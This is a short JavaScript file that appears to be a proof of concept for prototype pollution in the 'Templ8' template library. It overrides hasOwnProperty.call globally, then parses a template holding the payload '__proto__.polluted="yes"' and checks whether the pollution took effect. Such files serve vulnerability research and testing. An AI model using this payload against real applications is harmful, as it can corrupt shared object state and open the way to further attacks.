Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const Templ8 = require('Templ8');
const tpl = new Templ8('{{__proto__.polluted="yes"}}');
tpl.parse();
try {
    console.log('{ ' + polluted + ', ' + 'yes' + ' }');
} catch {
    console.log('{ ' + false + ', ' + true + ' }');
}